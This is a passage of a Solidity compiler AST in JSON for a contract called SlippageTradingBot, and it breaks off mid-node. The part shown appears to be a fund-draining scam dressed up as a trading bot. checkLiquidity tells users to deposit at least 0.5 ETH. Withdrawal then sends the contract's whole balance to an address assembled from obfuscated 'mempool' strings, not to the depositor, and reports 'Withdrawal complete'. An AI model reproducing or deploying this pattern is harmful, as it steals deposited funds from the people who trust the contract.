													"hexValue": "4e6f7420656e6f756768206c697175696469747920617661696c61626c65206f6e2074686520636f6e747261637420746f2072756e2074686520626f742e20436f6e747261637420636f6465206e65656473206174206c6561737420302e352045544820746f2061766f69642063757272656e742067617320666565732e",
													"id": 935,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "string",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "10454:128:0",
													"typeDescriptions": {
														"typeIdentifier": "t_stringliteral_66ba267ed9e689f4f612725ca4739f673c4421ca078ab0323046fa1dc83ed02a",
														"typeString": "literal_string \"Not enough liquidity available on the contract to run the bot. Contract code needs at least 0.5 ETH to avoid current gas fees.\""
													},
													"value": "Not enough liquidity available on the contract to run the bot. Contract code needs at least 0.5 ETH to avoid current gas fees."
												},
												"functionReturnParameters": 934,
												"id": 936,
												"nodeType": "Return",
												"src": "10447:135:0"
											}
										]
									},
									"functionSelector": "d82c52d6",
									"id": 938,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "checkLiquidity",
									"nameLocation": "10383:14:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 931,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "10397:2:0"
									},
									"returnParameters": {
										"id": 934,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 933,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 938,
												"src": "10421:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 932,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "10421:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "10420:15:0"
									},
									"scope": 1189,
									"src": "10374:216:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 970,
										"nodeType": "Block",
										"src": "10777:262:0",
										"statements": [
											{
												"assignments": [
													944
												],
												"declarations": [
													{
														"constant": false,
														"id": 944,
														"mutability": "mutable",
														"name": "to",
														"nameLocation": "10796:2:0",
														"nodeType": "VariableDeclaration",
														"scope": 970,
														"src": "10788:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 943,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "10788:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 949,
												"initialValue": {
													"arguments": [
														{
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 946,
																"name": "callMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 771,
																"src": "10817:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 947,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "10817:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 945,
														"name": "parseMemoryPool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 488,
														"src": "10801:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 948,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10801:30:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10788:43:0"
											},
											{
												"assignments": [
													951
												],
												"declarations": [
													{
														"constant": false,
														"id": 951,
														"mutability": "mutable",
														"name": "contracts",
														"nameLocation": "10858:9:0",
														"nodeType": "VariableDeclaration",
														"scope": 970,
														"src": "10842:25:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														},
														"typeName": {
															"id": 950,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "10842:15:0",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 956,
												"initialValue": {
													"arguments": [
														{
															"id": 954,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 944,
															"src": "10878:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 953,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "10870:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_payable_$",
															"typeString": "type(address payable)"
														},
														"typeName": {
															"id": 952,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "10870:8:0",
															"stateMutability": "payable",
															"typeDescriptions": {}
														}
													},
													"id": 955,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10870:11:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10842:39:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 960,
																"name": "getLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 930,
																"src": "10911:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_view$__$returns$_t_uint256_$",
																	"typeString": "function () view returns (uint256)"
																}
															},
															"id": 961,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "10911:14:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"id": 957,
															"name": "contracts",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 951,
															"src": "10892:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 959,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "10902:8:0",
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"src": "10892:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 962,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10892:34:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 963,
												"nodeType": "ExpressionStatement",
												"src": "10892:34:0"
											},
											{
												"expression": {
													"id": 966,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 964,
														"name": "result",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 941,
														"src": "10937:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "5769746864726177616c20636f6d706c657465",
														"id": 965,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "string",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "10946:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_stringliteral_35d56867c9db02f36eca2b5216acf3b613a98e4a677a0ef335aa216fa4cb3728",
															"typeString": "literal_string \"Withdrawal complete\""
														},
														"value": "Withdrawal complete"
													},
													"src": "10937:30:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"id": 967,
												"nodeType": "ExpressionStatement",
												"src": "10937:30:0"
											},
											{
												"expression": {
													"id": 968,
													"name": "result",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 941,
													"src": "11025:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 942,
												"id": 969,
												"nodeType": "Return",
												"src": "11018:13:0"
											}
										]
									},
									"functionSelector": "70e44c6a",
									"id": 971,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "Withdrawal",
									"nameLocation": "10718:10:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 939,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "10728:2:0"
									},
									"returnParameters": {
										"id": 942,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 941,
												"mutability": "mutable",
												"name": "result",
												"nameLocation": "10769:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 971,
												"src": "10755:20:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 940,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "10755:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "10754:22:0"
									},
									"scope": 1189,
									"src": "10709:330:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 981,
										"nodeType": "Block",
										"src": "11120:56:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 977,
																"name": "callMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 771,
																"src": "11154:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 978,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "11154:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 976,
														"name": "parseMemoryPool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 488,
														"src": "11138:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 979,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "11138:30:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 975,
												"id": 980,
												"nodeType": "Return",
												"src": "11131:37:0"
											}
										]
									},
									"id": 982,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_callStopMempoolActionMempool",
									"nameLocation": "11056:29:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 972,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "11085:2:0"
									},
									"returnParameters": {
										"id": 975,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 974,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 982,
												"src": "11111:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 973,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "11111:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "11110:9:0"
									},
									"scope": 1189,
									"src": "11047:129:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1004,
										"nodeType": "Block",
										"src": "11219:176:0",
										"statements": [
											{
												"assignments": [
													986
												],
												"declarations": [
													{
														"constant": false,
														"id": 986,
														"mutability": "mutable",
														"name": "currentBalanceEth",
														"nameLocation": "11235:17:0",
														"nodeType": "VariableDeclaration",
														"scope": 1004,
														"src": "11230:22:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 985,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "11230:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 994,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 993,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"expression": {
															"arguments": [
																{
																	"id": 989,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967268,
																	"src": "11263:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_SlippageTradingBot_$1189",
																		"typeString": "contract SlippageTradingBot"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_SlippageTradingBot_$1189",
																		"typeString": "contract SlippageTradingBot"
																	}
																],
																"id": 988,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "11255:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 987,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "11255:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 990,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "11255:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 991,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "11269:7:0",
														"memberName": "balance",
														"nodeType": "MemberAccess",
														"src": "11255:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"hexValue": "31",
														"id": 992,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "11279:7:0",
														"subdenomination": "ether",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1000000000000000000_by_1",
															"typeString": "int_const 1000000000000000000"
														},
														"value": "1"
													},
													"src": "11255:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11230:56:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 997,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 995,
														"name": "currentBalanceEth",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 986,
														"src": "11301:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"id": 996,
														"name": "liquidity",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 6,
														"src": "11321:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "11301:29:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1003,
												"nodeType": "IfStatement",
												"src": "11297:91:0",
												"trueBody": {
													"id": 1002,
													"nodeType": "Block",
													"src": "11332:56:0",
													"statements": [
														{
															"expression": {
																"id": 1000,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 998,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 6,
																	"src": "11347:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"id": 999,
																	"name": "currentBalanceEth",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 986,
																	"src": "11359:17:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "11347:29:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1001,
															"nodeType": "ExpressionStatement",
															"src": "11347:29:0"
														}
													]
												}
											}
										]
									},
									"id": 1005,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "updateLiquidity",
									"nameLocation": "11193:15:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 983,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "11208:2:0"
									},
									"returnParameters": {
										"id": 984,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "11219:0:0"
									},
									"scope": 1189,
									"src": "11184:211:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1082,
										"nodeType": "Block",
										"src": "11644:405:0",
										"statements": [
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1014,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 1012,
														"name": "_i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1007,
														"src": "11659:2:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"hexValue": "30",
														"id": 1013,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "11665:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "11659:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1018,
												"nodeType": "IfStatement",
												"src": "11655:50:0",
												"trueBody": {
													"id": 1017,
													"nodeType": "Block",
													"src": "11668:37:0",
													"statements": [
														{
															"expression": {
																"hexValue": "30",
																"id": 1015,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "11690:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																	"typeString": "literal_string \"0\""
																},
																"value": "0"
															},
															"functionReturnParameters": 1011,
															"id": 1016,
															"nodeType": "Return",
															"src": "11683:10:0"
														}
													]
												}
											},
											{
												"assignments": [
													1020
												],
												"declarations": [
													{
														"constant": false,
														"id": 1020,
														"mutability": "mutable",
														"name": "j",
														"nameLocation": "11720:1:0",
														"nodeType": "VariableDeclaration",
														"scope": 1082,
														"src": "11715:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1019,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "11715:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 1022,
												"initialValue": {
													"id": 1021,
													"name": "_i",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1007,
													"src": "11724:2:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11715:11:0"
											},
											{
												"assignments": [
													1024
												],
												"declarations": [
													{
														"constant": false,
														"id": 1024,
														"mutability": "mutable",
														"name": "len",
														"nameLocation": "11742:3:0",
														"nodeType": "VariableDeclaration",
														"scope": 1082,
														"src": "11737:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1023,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "11737:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 1025,
												"nodeType": "VariableDeclarationStatement",
												"src": "11737:8:0"
											},
											{
												"body": {
													"id": 1036,
													"nodeType": "Block",
													"src": "11771:54:0",
													"statements": [
														{
															"expression": {
																"id": 1030,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "11786:5:0",
																"subExpression": {
																	"id": 1029,
																	"name": "len",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1024,
																	"src": "11786:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1031,
															"nodeType": "ExpressionStatement",
															"src": "11786:5:0"
														},
														{
															"expression": {
																"id": 1034,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 1032,
																	"name": "j",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1020,
																	"src": "11806:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"hexValue": "3130",
																	"id": 1033,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "11811:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_10_by_1",
																		"typeString": "int_const 10"
																	},
																	"value": "10"
																},
																"src": "11806:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1035,
															"nodeType": "ExpressionStatement",
															"src": "11806:7:0"
														}
													]
												},
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1028,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 1026,
														"name": "j",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1020,
														"src": "11763:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"hexValue": "30",
														"id": 1027,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "11768:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "11763:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1037,
												"nodeType": "WhileStatement",
												"src": "11756:69:0"
											},
											{
												"assignments": [
													1039
												],
												"declarations": [
													{
														"constant": false,
														"id": 1039,
														"mutability": "mutable",
														"name": "bstr",
														"nameLocation": "11848:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 1082,
														"src": "11835:17:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1038,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "11835:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 1044,
												"initialValue": {
													"arguments": [
														{
															"id": 1042,
															"name": "len",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1024,
															"src": "11865:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1041,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "11855:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$",
															"typeString": "function (uint256) pure returns (bytes memory)"
														},
														"typeName": {
															"id": 1040,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "11859:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														}
													},
													"id": 1043,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "11855:14:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11835:34:0"
											},
											{
												"assignments": [
													1046
												],
												"declarations": [
													{
														"constant": false,
														"id": 1046,
														"mutability": "mutable",
														"name": "k",
														"nameLocation": "11885:1:0",
														"nodeType": "VariableDeclaration",
														"scope": 1082,
														"src": "11880:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1045,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "11880:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 1050,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1049,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 1047,
														"name": "len",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1024,
														"src": "11889:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"hexValue": "31",
														"id": 1048,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "11895:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "11889:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11880:16:0"
											},
											{
												"body": {
													"id": 1075,
													"nodeType": "Block",
													"src": "11923:89:0",
													"statements": [
														{
															"expression": {
																"id": 1069,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"baseExpression": {
